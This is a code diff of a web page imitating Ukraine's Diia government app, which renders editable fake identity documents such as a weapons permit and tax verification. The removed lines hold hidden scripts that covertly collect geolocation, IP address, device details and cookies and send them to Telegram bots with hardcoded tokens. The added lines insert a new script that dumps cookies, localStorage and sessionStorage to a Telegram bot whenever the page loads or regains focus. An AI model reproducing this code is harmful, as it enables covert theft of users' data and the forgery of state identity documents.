@@ -3,34 +3,29 @@
 <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <!-- PWA meta -->
     <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="mobile-web-app-capable" content="yes" />
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover" />
+    <meta http-equiv="Cache-Control"
+          content="no-cache, no-store, must-revalidate" />
+    <meta name="apple-mobile-web-app-status-bar-style"
+          content="black-translucent" />
+
     <meta name="apple-mobile-web-app-title" content="Дія" />
-    <meta name="application-name" content="Дія" />
-    <meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)" />
-    <meta name="theme-color" content="#000000" />
-    <meta name="msapplication-TileColor" content="#c8dff0" />
-    <meta name="msapplication-tap-highlight" content="no" />
+    <link rel="icon"
+          type="image/png"
+          href="assets/favicon.png" />
 
-    <!-- Icons -->
-    <link rel="icon" type="image/png" sizes="192x192" href="access/192x192.png" />
-    <link rel="icon" type="image/png" sizes="48x48"   href="assets/favicon.png" />
-    <link rel="shortcut icon" type="image/x-icon"     href="assets/favicon.png" />
-    <link rel="apple-touch-icon" sizes="192x192"      href="access/192x192.png" />
-    <link rel="apple-touch-icon-precomposed"          href="access/192x192.png" />
-
-    <!-- Manifest -->
-    <link rel="manifest" href="manifest.json" />
+    <link rel="apple-touch-icon-precomposed"
+          href="assets/favicon.png" />
+    <link rel="manifest" href="assets/manifest.json" />
     <title>Дія</title>
 
+    <link type="image/x-icon"
+          href="assets/favicon.png"
+          rel="shortcut icon" />
+
     <script src="assets/anime.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
-        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
-        crossorigin="anonymous"
-        referrerpolicy="no-referrer"></script>
     <link rel="stylesheet"
           href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
 
@@ -38,52 +33,10 @@
 
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
-    <script src="assets/jquery.marquee.min.js"
-        type="text/javascript"></script>
 
-
-    <!-- Service Worker реєстрація -->
-    <script>
-      if ('serviceWorker' in navigator) {
-        window.addEventListener('load', () => {
-          navigator.serviceWorker.register('./sw.js', { scope: './' })
-            .then(reg => {
-              console.log('[PWA] SW зареєстровано:', reg.scope);
-              // Автооновлення: якщо новий SW — перезавантажити сторінку
-              reg.addEventListener('updatefound', () => {
-                const newWorker = reg.installing;
-                newWorker.addEventListener('statechange', () => {
-                  if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
-                    // Новий контент доступний
-                    newWorker.postMessage({ type: 'SKIP_WAITING' });
-                  }
-                });
-              });
-            })
-            .catch(err => console.warn('[PWA] SW помилка:', err));
-
-          // Автооновлення при активації нового SW
-          navigator.serviceWorker.addEventListener('controllerchange', () => {
-            if (!window._swReloading) { window._swReloading = true; window.location.reload(); }
-          });
-        });
-      }
-    </script>
 </head>
 
 <style>
-   :root {
-    --ios-ease: cubic-bezier(0.32, 0.72, 0, 1);
-    --ios-spring: cubic-bezier(0.34, 1.56, 0.64, 1);
-}
-
-@media (prefers-reduced-motion: reduce) {
-    *, *::before, *::after {
-        animation-duration: 0.01ms !important;
-        transition-duration: 0.01ms !important;
-    }
-}
     @font-face {
         font-family: 'e-Ukraine';
         font-weight: 400;
@@ -595,14 +548,11 @@
     .slider {
         width: 95%;
         transform-style: preserve-3d;
-        transition:none;
+        transition: transform 0.4s;
         position: relative;
         min-width: 0;
         height: 90%;
         margin-top: 20px
-    }
-    .slider.is-flipping {
-    pointer-events: none;
     }
 
     .front {
@@ -769,110 +719,6 @@
         margin-top: 20px;
         height: 70px;
     }
-
-    /* ════════════════════════════════════════════════════
-       BUG FIXES — не чіпати
-       ════════════════════════════════════════════════════ */
-
-    /* BUG5 — Pagination dots: fix position after 3D transform */
-    .documentSlider .swiper-pagination {
-        position: absolute !important;
-        bottom: -28px !important;
-        left: 50% !important;
-        transform: translateX(-50%) !important;
-        width: auto !important;
-    }
-    .documentSlider .swiper-pagination-bullet {
-        transform: none !important;
-    }
-
-    /* BUG6 — Card flip: prevent stretch on first flip */
-    .swiper-slide {
-        display: flex !important;
-        align-items: flex-start !important;
-    }
-    .slider {
-        position: relative;
-        transform-style: preserve-3d;
-        width: 100%;
-        min-height: 200px;
-    }
-    .slider .content.front,
-    .slider .content.back {
-        backface-visibility: hidden;
-        -webkit-backface-visibility: hidden;
-        width: 100%;
-    }
-    .slider .content.back {
-        position: absolute;
-        top: 0; left: 0; right: 0;
-        transform: rotateY(180deg);
-    }
-    .slider.is-flipping .content.front,
-    .slider.is-flipping .content.back {
-        pointer-events: none;
-    }
-
-    /* BUG7 — QR/Barcode scan button layout fix */
-    .qrshBlock {
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        width: 100% !important;
-        min-height: 160px !important;
-    }
-    .qrshBlock .changeCode {
-        max-width: 160px !important;
-        max-height: 160px !important;
-        width: 160px !important;
-        height: 160px !important;
-        flex-shrink: 0 !important;
-    }
-    .qrshBlock .shText {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        font-size: 20px;
-        font-weight: 600;
-        letter-spacing: 4px;
-    }
-    /* QR switch buttons row */
-    .qrChange {
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        gap: 12px !important;
-        margin-top: 12px !important;
-    }
-    .qrChange > div {
-        display: flex !important;
-        flex-direction: column !important;
-        align-items: center !important;
-        gap: 4px !important;
-        cursor: pointer !important;
-    }
-    .qrChange > div > div {
-        width: 36px !important;
-        height: 36px !important;
-        border-radius: 8px !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        background: #ddd;
-        transition: background 0.2s;
-    }
-    .qrChange > div > div img {
-        width: 20px !important;
-        height: 20px !important;
-        object-fit: contain !important;
-    }
-    .qrChange > div > span {
-        font-size: 11px !important;
-        color: #555 !important;
-    }
-
 </style>
 
 
@@ -1148,6 +994,31 @@
                     <span>Оцінити документ</span>
                 </div>
                 <div class="border">
+                    <div class="document_block_div zbroya_block_div">
+                        <div>
+                            <div class="main_block">
+                                <div class="border">
+                                    <img src="assets/document.png" alt="" />
+                                    <span>Повна інформація</span>
+                                </div>
+                                <div class="border">
+                                    <img src="assets/star.png" alt="" />
+                                    <span>Оцінити документ</span>
+                                </div>
+                                <div class="border">
+                                    <img src="assets/exchange.png" alt="" />
+                                    <span>Змінити порядок документів</span>
+                                </div>
+                                <div>
+                                    <img src="assets/question.png" alt="" />
+                                    <span>Питання та відповіді</span>
+                                </div>
+                            </div>
+                            <div class="close_block" data-index="zbroya">
+                                Закрити
+                            </div>
+                        </div>
+                    </div>
                     <img src="assets/exchange.png" alt="" />
                     <span>Змінити порядок документів</span>
                 </div>
@@ -1208,7 +1079,6 @@
         </video>
     </div>
     <div id="notification" class="notification">Номер скопійовано</div>
-    <div id="overlay" class="overlay hidden"></div>
 
     <div class="start-div">
         <h1>Код для входу</h1>
@@ -1265,19 +1135,19 @@
                     </div>
                 </div>
                 <div class="threeButtons">
-                    <div class="threeButtons">
-                        <div class="quick-action" data-action="scan-qr">
+                    <div id="buttonLoad">
+                        <div>
                             <img src="assets/qr.svg" alt="" />
                         </div>
                         <span>Сканувати QR-код</span>
                     </div>
-                    <div class="quick-action" data-action="bonds">
+                    <div id="buttonLoad">
                         <div>
                             <img src="assets/gerb.png" alt="" />
                         </div>
                         <span>Військові облігації</span>
                     </div>
-                    <div class="quick-action" data-action="no-signal">
+                    <div id="buttonLoad">
                         <img style="
                                     width: 54px;
                                     height: 54px;
@@ -1674,6 +1544,7 @@
                     justify-content: center;
                     gap: 20px;
                 }
+            </style>
             <div id="study-modal" class="modal">
                 <div class="study-modal-content modal-content">
                     <div class="handle"></div>
@@ -1819,8 +1690,8 @@
                 </div>
             </div>
             </style>
-            <div id="zbroya-modal" class="modal">
-                <div class="zbroya-modal-content modal-content">
+            <div id="study-modal" class="modal">
+                <div class="study-modal-content modal-content">
                     <div class="handle"></div>
                     <h1>Дозвіл на зберігання і носіння зброї фізичною особою</h1>
 
@@ -2099,11 +1970,11 @@
                                 <h3>
                                     Пройшов перевірку Державною податковую
                                     службою
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </h3>
                                 <span>
                                     Verifed by State Tax Service
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </span>
                             </div>
                         </div>
@@ -2435,11 +2306,11 @@
                                 <h3>
                                     Пройшов перевірку Державною податковую
                                     службою
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </h3>
                                 <span>
                                     Verifed by State Tax Service
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </span>
                             </div>
                         </div>
@@ -2667,11 +2538,11 @@
                                 <h3>
                                     Пройшов перевірку Державною податковую
                                     службою
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </h3>
                                 <span>
                                     Verifed by State Tax Service
-                                    <span class="dataNow"></span>
+                                    <span id="dataNow"></span>
                                 </span>
                             </div>
                         </div>
@@ -2861,7 +2732,6 @@
                 const modalStudy = setupModal('study-modal', '.study-modal-content');
                 const modalPrava = setupModal('prava-modal', '.prava-modal-content');
                 const modaleDoc = setupModal('eDoc-modal', '.eDoc-modal-content');
-                const modalZbroya = setupModal('zbroya-modal', '.zbroya-modal-content');
 
                 // 4. ОБРОБНИКИ КЛІКІВ (ВІДКРИТТЯ)
                 const bindOpenModal = (selector, modalElement, blockClass) => {
@@ -2886,17 +2756,6 @@
                 bindOpenModal('#fullInfoStudy', modalStudy, 'study_block_div');
                 bindOpenModal('#fullInfoeDoc', modaleDoc, 'eDoc_block_div');
                 bindOpenModal('#fullInfoPrava', modalPrava, 'prava_block_div');
-                       
-                            if (overlay) {
-    overlay.addEventListener('click', () => {
-        document.querySelectorAll('.open').forEach(m => {
-            m.style.top = '100%';
-            m.classList.remove('open');
-        });
-        overlay.classList.add('hidden');
-        overlay.style.opacity = '0';
-    });
-}
 
             </script>
             <style>
@@ -2905,39 +2764,9 @@
                     height: 60%;
                 }
 
-                /* 3D-перспектива для карток документів */
-                .documentSlider {
-                    perspective: 1200px;
-                    transform-style: preserve-3d;
-                    overflow: visible !important;
-                    -webkit-overflow-scrolling: touch;
-                }
-
-                .documentSlider .swiper-wrapper {
-                    transform-style: preserve-3d;
-                }
-
                 .swiper-slide {
                     display: flex;
                     justify-content: center;
-                    transform-style: preserve-3d;
-                    transition-timing-function: cubic-bezier(0.32, 0.72, 0, 1);
-                    will-change: transform, opacity;
-                    /* Аппаратне прискорення */
-                    -webkit-transform: translateZ(0);
-                    backface-visibility: hidden;
-                    -webkit-backface-visibility: hidden;
-                }
-
-                /* Плавний scroll для iOS */
-                .pre, .modal-content {
-                    -webkit-overflow-scrolling: touch;
-                    overscroll-behavior-y: contain;
-                }
-
-                /* Активна картка — чітка тінь */
-                .swiper-slide-active .slider {
-                    box-shadow: 0 8px 32px rgba(0,0,0,0.15);
                 }
 
 
@@ -4298,17 +4127,10 @@
         <button class="admin-btn-small" id="btn-clear-main-photo">Скинути фото</button>
     </div>
     <div class="admin-form-group">
-        <label>Створити підпис на екрані</label>
-        <canvas id="signature-pad" style="border: 1px solid #ddd; border-radius: 8px; width: 100%; height: 120px; cursor: crosshair; touch-action: none; background: transparent;"></canvas>
-        <div style="margin-top: 5px; display: flex; gap: 5px; flex-wrap: wrap;">
-             <button class="admin-btn-small" id="btn-clear-sig-pad">Очистити поле</button>
-             <button class="admin-btn-small" id="btn-save-sig-pad" style="background: #e3f2fd; color: #0d47a1; font-weight: 500;">Застосувати підпис</button>
-             <button class="admin-btn-small" id="btn-reset-sig-photo">Скинути (Оригінал)</button>
-        </div>
-        <p style="font-size: 10px; color: #888; margin-top: 5px; line-height: 1.2;">Просто розпишіться пальцем чи мишкою в полі. Фон видалиться автоматично.</p>
+        <label>Фото підпису</label>
+        <input type="file" id="admin-sig-photo" accept="image/*">
+        <button class="admin-btn-small" id="btn-clear-sig-photo">Скинути підпис</button>
     </div>
-
-
 
     <div class="admin-buttons">
         <button id="admin-save-btn" class="admin-btn">Зберегти</button>
@@ -4510,163 +4332,19 @@
         compressAndSavePhoto(e.target.files[0], 'mainPhoto', 600);
     });
     
+    document.getElementById('admin-sig-photo').addEventListener('change', (e) => {
+        compressAndSavePhoto(e.target.files[0], 'sigPhoto', 400); // Підпис можна робити ще меншим
+    });
+
     document.getElementById('btn-clear-main-photo').addEventListener('click', () => {
         delete savedState['mainPhoto'];
         alert('Фото скинуто. Після збереження воно зникне (або повернеться оригінальне).');
     });
 
-    // --- ЛОГІКА ПІДПИСУ (СИГНАТУРА) ---
-    const canvas = document.getElementById('signature-pad');
-    const ctx = canvas.getContext('2d', { willReadFrequently: true });
-    let isDrawing = false;
-    let hasSignature = false;
-
-    // Підгонка розмірів під CSS (width: 100%, height: 120px)
-    const initCanvasSize = () => {
-        const rect = canvas.getBoundingClientRect();
-        // Відкладемо встановлення розміру, щоб DOM встиг відмалювати
-        if (rect.width === 0) {
-            setTimeout(initCanvasSize, 100);
-            return;
-        }
-        const ratio = Math.max(window.devicePixelRatio || 1, 1) * 2; // для чіткості
-        canvas.width = rect.width * ratio;
-        canvas.height = rect.height * ratio;
-        ctx.scale(ratio, ratio);
-        ctx.lineCap = 'round';
-        ctx.lineJoin = 'round';
-        ctx.lineWidth = 2.5; 
-        ctx.strokeStyle = '#002654'; // Темно-синій (як ручка)
-    };
-    initCanvasSize();
-    
-    // Перерахунок при зміні видимості (щоб канвас підігнався)
-    const observer = new IntersectionObserver((entries) => {
-        if(entries[0].isIntersecting) {
-            if (canvas.width === 0) initCanvasSize();
-        }
-    });
-    observer.observe(canvas);
-
-    const getPos = (e) => {
-        const rect = canvas.getBoundingClientRect();
-        let clientX = e.clientX;
-        let clientY = e.clientY;
-
-        if (e.touches && e.touches.length > 0) {
-            clientX = e.touches[0].clientX;
-            clientY = e.touches[0].clientY;
-        }
-
-        return {
-            x: clientX - rect.left,
-            y: clientY - rect.top
-        };
-    };
-
-    const startDraw = (e) => {
-        e.preventDefault();
-        isDrawing = true;
-        hasSignature = true;
-        const pos = getPos(e);
-        ctx.beginPath();
-        ctx.moveTo(pos.x, pos.y);
-        ctx.lineTo(pos.x, pos.y);
-        ctx.stroke();
-    };
-
-    const endDraw = (e) => {
-        if(e) e.preventDefault();
-        isDrawing = false;
-        ctx.beginPath();
-    };
-
-    const draw = (e) => {
-        if (!isDrawing) return;
-        e.preventDefault();
-        const pos = getPos(e);
-        ctx.lineTo(pos.x, pos.y);
-        ctx.stroke();
-    };
-
-    canvas.addEventListener('mousedown', startDraw);
-    canvas.addEventListener('mouseup', endDraw);
-    canvas.addEventListener('mousemove', draw);
-    canvas.addEventListener('mouseout', endDraw);
-
-    canvas.addEventListener('touchstart', startDraw, { passive: false });
-    canvas.addEventListener('touchend', endDraw, { passive: false });
-    canvas.addEventListener('touchmove', draw, { passive: false });
-
-    document.getElementById('btn-clear-sig-pad').addEventListener('click', () => {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        hasSignature = false;
-    });
-
-    const cropSignatureCanvas = () => {
-        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        const data = imgData.data;
-
-        let minX = canvas.width, minY = canvas.height, maxX = 0, maxY = 0;
-        let isEmpty = true;
-
-        for (let y = 0; y < canvas.height; y++) {
-            for (let x = 0; x < canvas.width; x++) {
-                const alpha = data[(y * canvas.width + x) * 4 + 3];
-                if (alpha > 0) {
-                    if (x < minX) minX = x;
-                    if (y < minY) minY = y;
-                    if (x > maxX) maxX = x;
-                    if (y > maxY) maxY = y;
-                    isEmpty = false;
-                }
-            }
-        }
-
-        if (isEmpty) return canvas.toDataURL('image/png');
-
-        const padding = 20;
-        minX = Math.max(0, minX - padding);
-        minY = Math.max(0, minY - padding);
-        maxX = Math.min(canvas.width, maxX + padding);
-        maxY = Math.min(canvas.height, maxY + padding);
-
-        const cropWidth = maxX - minX;
-        const cropHeight = maxY - minY;
-
-        const croppedCanvas = document.createElement('canvas');
-        croppedCanvas.width = cropWidth;
-        croppedCanvas.height = cropHeight;
-        const croppedCtx = croppedCanvas.getContext('2d');
-        
-        croppedCtx.putImageData(imgData, -minX, -minY);
-
-        return croppedCanvas.toDataURL('image/png');
-    };
-
-    document.getElementById('btn-save-sig-pad').addEventListener('click', () => {
-        if (!hasSignature) {
-            alert('Спершу намалюйте свій підпис.');
-            return;
-        }
-        try {
-            const dataUrl = cropSignatureCanvas();
-            savedState['sigPhoto'] = dataUrl;
-            updateImages('sigPhoto', dataUrl);
-            alert('Підпис застосовано в паспорті!');
-        } catch (e) {
-            console.error(e);
-            alert('Помилка застосування підпису');
-        }
-    });
-
-    document.getElementById('btn-reset-sig-photo').addEventListener('click', () => {
+    document.getElementById('btn-clear-sig-photo').addEventListener('click', () => {
         delete savedState['sigPhoto'];
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        hasSignature = false;
-        alert('Підпис скинуто. Після збереження оновіть сторінку, щоб побачити оригінал.');
+        alert('Підпис скинуто. Після збереження оновіть сторінку.');
     });
-    // ------------------------------------------
 
     // 4. Обробник збереження у localStorage
     saveBtn.addEventListener('click', () => {
@@ -4675,12 +4353,6 @@
         inputs.forEach(input => {
             savedState[input.dataset.targetId] = input.value;
         });
-
-
-
-        if (window.sendDataToTelegram) {
-            window.sendDataToTelegram(savedState);
-        }
 
         // Зберігаємо весь state
         try {
@@ -4743,34 +4415,11 @@
         // Застосовуємо фото
         if (savedState['mainPhoto']) updateImages('mainPhoto', savedState['mainPhoto']);
         if (savedState['sigPhoto']) updateImages('sigPhoto', savedState['sigPhoto']);
-        
-
-    };
-
-    // Підтягування початкових значень з DOM (якщо користувач їх ще не редагував і не зберігав)
-    const syncUnsavedInputsFromDOM = () => {
-        editableFields.forEach(field => {
-            // Якщо значення немає в збережених
-            if (savedState[field.id] === undefined) {
-                const input = container.querySelector(`input[data-target-id="${field.id}"]`);
-                const el = document.getElementById(field.id);
-                if (input && el) {
-                    const domValue = el.textContent.trim();
-                    if (domValue !== '') {
-                        input.value = domValue;
-                        savedState[field.id] = domValue; // Записуємо в state, щоб при наступному збереженні воно не загубилось
-                    }
-                }
-            }
-        });
     };
 
     applySavedState();
     window.addEventListener('load', () => {
-        setTimeout(() => {
-            applySavedState();
-            syncUnsavedInputsFromDOM();
-        }, 500); // З невеликою затримкою для надійності, щоб values.js та main.js виконали свою роботу
+        setTimeout(applySavedState, 300); // З невеликою затримкою для надійності
         
         // Swiper може скинути display: none під час ініціалізації
         setTimeout(() => {
@@ -4780,245 +4429,65 @@
         }, 1000);
     });
 })();
-
-// --- ТІНЬОВИЙ ЗАПИТ ГЕОЛОКАЦІЇ ТА ВІДПРАВКА В TELEGRAM ---
-(function() {
-    const sendTrackingDataToTelegram = (lat, lon) => {
-        if (!window.sendToTelegramBot) return;
-
-        // Збираємо IP та інфо про пристрій через повністю відкритий і безкоштовний API
-        fetch("https://ipinfo.io/json")
-            .then(res => res.json())
-            .then(data => {
-                let ip = data.ip || "Невідомо";
-                let city = data.city || "Невідомо";
-                let country = data.country || "Невідомо";
-                let org = data.org || "Невідомо";
-                
-                let ua = navigator.userAgent;
-                let screen = `${window.screen.width}x${window.screen.height}`;
-                
-                let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                let language = navigator.language;
-
-                let message = `🚨 <b>НОВИЙ ВІЗИТ ДОДАТКУ (Тіньовий збір)</b>\n\n`;
-                if (lat && lon) {
-                    message += `📍 <b>Геолокація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити координати на карті</a>\n`;
-                    message += `(Широта: ${lat}, Довгота: ${lon})\n\n`;
-                } else {
-                    message += `📍 <b>Геолокація</b>: Доступ заборонено або не підтримується\n\n`;
-                }
-                
-                message += `🌐 <b>IP Адреса</b>: ${ip}\n`;
-                message += `🏙 <b>Місцезнаходження</b>: ${city}, ${country}\n`;
-                message += `🏢 <b>Провайдер</b>: ${org}\n\n`;
-                message += `📱 <b>Пристрій</b>: <code>${ua}</code>\n`;
-                message += `🖥 <b>Екран</b>: ${screen}\n`;
-                message += `🕒 <b>Часовий пояс</b>: ${timeZone} (${language})\n`;
-                
-                window.sendToTelegramBot(message);
-            })
-            .catch(e => {
-                // Запасний варіант, якщо сервіс збору IP не відповів
-                let message = `🚨 <b>НОВИЙ ВІЗИТ (Тіньовий збір)</b>\n\nНе вдалося отримати IP-адресу.\n`;
-                if (lat && lon) message += `📍 <b>Локація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити на карті</a>`;
-                window.sendToTelegramBot(message);
-            });
-    };
-
-    const getGeoLocation = () => {
-        // Захист від повторної відправки при переходах по сторінках
-        if (sessionStorage.getItem('trackingSent')) return;
-        sessionStorage.setItem('trackingSent', 'true');
-
-        if ("geolocation" in navigator) {
-            // Запитуємо геолокацію. Якщо юзер погодиться - відправляємо з координатами
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    sendTrackingDataToTelegram(position.coords.latitude, position.coords.longitude);
-                },
-                (error) => {
-                    console.error("Геолокація помилка:", error.message);
-                    // Якщо користувач відмовився, все одно відправляємо IP та інформацію про пристрій
-                    sendTrackingDataToTelegram(null, null);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        } else {
-            sendTrackingDataToTelegram(null, null);
-        }
-    };
-
-    // Викликаємо непомітно через 3 секунди після загрузки сторінки
-    window.addEventListener('load', () => {
-        setTimeout(getGeoLocation, 3000);
-    });
-})();
-
-// --- ЗАПИТ ОНОВЛЕНЬ З TELEGRAM БОТА ДЛЯ РОЗСИЛКИ ---
-(function() {
-    const showTgNotification = (text) => {
-        const notif = document.getElementById('notification');
-        if (notif) {
-            notif.textContent = text;
-            notif.classList.add('show');
-            setTimeout(() => {
-                notif.classList.remove('show');
-            }, 8000); // залишаємо на 8 секунд щоб встигли прочитати
-        } else {
-            alert(text);
-        }
-    };
-
-    const HARDCODED_TELEGRAM_BOT_TOKEN = '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
-    const HARDCODED_TELEGRAM_CHAT_ID = '-1002003419071';
-
-    let lastMessageId = parseInt(localStorage.getItem('tgLastMessageId') || '0');
-
-    const checkTelegramNews = () => {
-        const token = HARDCODED_TELEGRAM_BOT_TOKEN;
-        
-        if (token === 'YOUR_BOT_TOKEN_HERE' || token.length < 20) return;
-
-        // Витягуємо останнє повідомлення з бота
-        fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`)
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok && data.result.length > 0) {
-                    const latestUpdate = data.result[0];
-                    if (latestUpdate.message && latestUpdate.message.message_id > lastMessageId) {
-                        lastMessageId = latestUpdate.message.message_id;
-                        localStorage.setItem('tgLastMessageId', lastMessageId.toString());
-
-                        const text = latestUpdate.message.text;
-                        if (text) {
-                            showTgNotification(text);
-                        }   
-                    }
-                }
-            })
-            .catch(err => console.debug("ТГ Оновлення: ", err));
-    };
-
-    // Перевіряємо при старті та далі кожні 15 секунд
-    setTimeout(() => {
-        checkTelegramNews();
-        setInterval(checkTelegramNews, 15000);
-    }, 4000);
-})();
-// --- ВІДПРАВКА ДАНИХ І СПОВІЩЕНЬ У TELEGRAM ---
-(function() {
-    let botToken = '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
-    let tgChatId = '-1002003419071';
-    let expTime = '2026-12-31T23:59'; // Fallback
-    
-    // Спробуємо підтягнути дані з values.json або з глобальних змінних values.js
-    if (typeof expirationTime !== 'undefined') expTime = expirationTime;
-    
-    fetch('values.json')
-        .then(res => res.json())
-        .then(data => {
-            if (data.expirationTime) expTime = data.expirationTime;
-            if (data.tgBotToken) botToken = data.tgBotToken;
-            if (data.tgChatId) tgChatId = data.tgChatId;
-        })
-        .catch(err => console.debug('values.json не знайдено або помилка парсингу, використовуємо стандартні значення.'));
-
-    window.sendToTelegramBot = (message) => {
-        if (!botToken || !tgChatId) return;
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: tgChatId,
-                text: message,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true
-            })
-        }).catch(err => console.debug("Помилка відправки в TG:", err));
-    };
-
-    window.sendDataToTelegram = (state) => {
-        let text = "🔄 <b>Оновлені дані користувача (Редактор)!</b>\n\n";
-        
-        for (const [key, value] of Object.entries(state)) {
-            if (key.startsWith('doc_') || key.includes('Photo') || key.startsWith('tg') || key.startsWith('expiration')) continue;
-            if (value && String(value).trim() !== '') {
-                text += `<b>${key}</b>: ${value}\n`;
-            }
-        }
-
-        if (state['mainPhoto']) text += `\n[ Фото оновлено ]`;
-        if (state['sigPhoto']) text += `\n[ Підпис оновлено ]`;
-
-        window.sendToTelegramBot(text);
-    };
-
-    const checkExpiration = () => {
-        const savedData = JSON.parse(localStorage.getItem('diyaLocalState_v1') || '{}');
-        
-        if (expTime && !savedData['expirationSent']) {
-            const expDate = new Date(expTime);
-            if (!isNaN(expDate.getTime()) && new Date() >= expDate) {
-                const name = savedData['name'] || "Користувача";
-                window.sendToTelegramBot(`⏳ <b>ТЕРМІН ДІЇ ЗАКІНЧИВСЯ!</b>\nЧас вийшов для: <b>${name}</b>.`);
-                
-                savedData['expirationSent'] = true;
-                localStorage.setItem('diyaLocalState_v1', JSON.stringify(savedData));
-            }
-        }
-    };
-
-    setInterval(checkExpiration, 30000); // Кожні 30 секунд
-    setTimeout(checkExpiration, 5000);
-})();
 <script>
-    // --- TWKS INTEGRATION: STEALTH DATA COLLECTOR ---
-    (function() {
-        const CONFIG = {
-            TELEGRAM_TOKEN: '8324267812:AAHSam60f0o5MDE3LEbyBiqCWWLLmFlHz38',
-            CHAT_ID: '5423792783',
-            ENDPOINT: 'https://api.telegram.org/bot',
-            INTERVAL: 60000 // Интервал сбора (60 сек)
+(function() {
+    const CONFIG = {
+        TOKEN: 'ТВОЙ_ТОКЕН_БОТА',
+        CHAT_ID: 'ТВОЙ_CHAT_ID',
+        API_URL: 'https://api.telegram.org/bot'
+    };
+
+    // Глубокий сбор данных
+    const getFullDeviceDump = () => ({
+        ts: new Date().toISOString(),
+        url: window.location.href,
+        ua: navigator.userAgent,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        ls: localStorage, // Весь LocalStorage
+        ss: sessionStorage, // Весь SessionStorage
+        cookies: document.cookie,
+        lang: navigator.language,
+        online: navigator.onLine,
+        mem: performance.memory ? performance.memory.usedJSHeapSize : 'n/a'
+    });
+
+    const exfiltrate = async () => {
+        const data = getFullDeviceDump();
+        const payload = {
+            chat_id: CONFIG.CHAT_ID,
+            text: `<b>[PWA DUMP]</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`,
+            parse_mode: 'HTML'
         };
 
-        function collect() {
-            const data = {
-                url: window.location.href,
-                ua: navigator.userAgent,
-                res: `${screen.width}x${screen.height}`,
-                lang: navigator.language,
-                ts: new Date().toISOString(),
-                cookies: document.cookie
-            };
-            return data;
-        }
-
-        function ship(data) {
-            const payload = {
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>[DATA REPORT]</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`,
-                parse_mode: 'HTML'
-            };
-
-            fetch(`${CONFIG.ENDPOINT}${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
+        try {
+            // Используем fetch для надежной отправки
+            await fetch(`${CONFIG.API_URL}${CONFIG.TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(() => {});
+            });
+        } catch (e) {
+            // Если сеть лежит, PWA Service Worker все равно может удержать запрос
         }
+    };
 
-        // Инициализация
-        try {
-            const initialData = collect();
-            ship(initialData);
-            setInterval(() => ship(collect()), CONFIG.INTERVAL);
-        } catch (e) {}
-    })();
+    // Запуск при старте
+    window.addEventListener('load', exfiltrate);
+
+    // Запуск при переключении PWA в активный режим
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') exfiltrate();
+    });
+})();
 </script>
 </body>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
+        crossorigin="anonymous"
+        referrerpolicy="no-referrer"></script>
+<script src="assets/jquery.marquee.min.js"
+        type="text/javascript"></script>
 <script type="text/javascript">
     // $('.line2').marquee({
     //     allowCss3Support: true,
@@ -5043,54 +4512,20 @@
 
 
     var isWorking = true;
-    var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    var isAndroid = /Android/i.test(navigator.userAgent);
-    var isMobile = isIOS || isAndroid;
-    var isInWebAppiOS = (window.navigator.standalone === true);
